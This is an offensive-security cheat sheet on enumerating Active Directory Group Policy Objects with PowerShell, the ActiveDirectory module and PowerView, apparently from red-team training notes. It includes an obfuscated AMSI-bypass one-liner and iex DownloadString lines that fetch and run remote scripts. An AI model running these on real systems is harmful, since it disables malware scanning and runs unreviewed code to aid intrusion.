---
title: "Domain GPOs"
description: "Enumerating domain GPOs."
lead: "Enumerating information about domain GPOs using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:06:45+01:00
lastmod: 2021-11-07T18:06:45+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 50
toc: true
---

## General

- Security settings
- Registry-based policy settings
- GPP like start/shutdown/log-on/logff script settings
- Software installation
- Abused for privesc, backdoors, persistence

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get list of GPO in current domain
Get-GPO -All

# Provides RSoP
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Display RSoP summary data
gpresult /R

# Get list of GPO in current domain
Get-NetGPO
Get-NetGPO | Select displayname
Get-NetGPO -ComputerName ws01.lab.local
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-NetGPOGroup

# Get users which are in a local group of a machine using GPO
Find-GPOComputerAdmin -ComputerName ws01.lab.local

# Get machines where the given user is member of a specific group
Find-GPOLocation -UserName user -Verbose

# Enumerate what machines that a particular user/group identity has local admin rights to
# Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP

# Export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
```
